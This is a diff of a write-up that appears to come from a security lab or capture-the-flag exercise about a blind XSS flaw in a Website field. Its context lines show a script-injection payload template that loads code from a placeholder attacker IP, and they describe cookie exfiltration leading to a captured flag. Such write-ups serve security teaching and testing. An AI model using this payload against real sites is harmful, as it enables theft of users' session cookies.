@@ -46,7 +46,7 @@ I injected payloads using the template `test<script src="http://<attacker_ip>/<f
 
 ![](screenshots/3.png)
 
-The listener confirmed that the Website field was vulnerable when the application attempted to load the external resource:
+The listener confirmed that the **Website** field was vulnerable when the application attempted to load the external resource:
 
 ![](screenshots/4.png)
 
@@ -106,4 +106,5 @@ This confirms the presence of a critical XSS vulnerability that could allow atta
 - Blind XSS successfully triggered via the **Website** field  
 - External script execution enabled cookie exfiltration  
 - Captured session data revealed the assessment flag
+
 
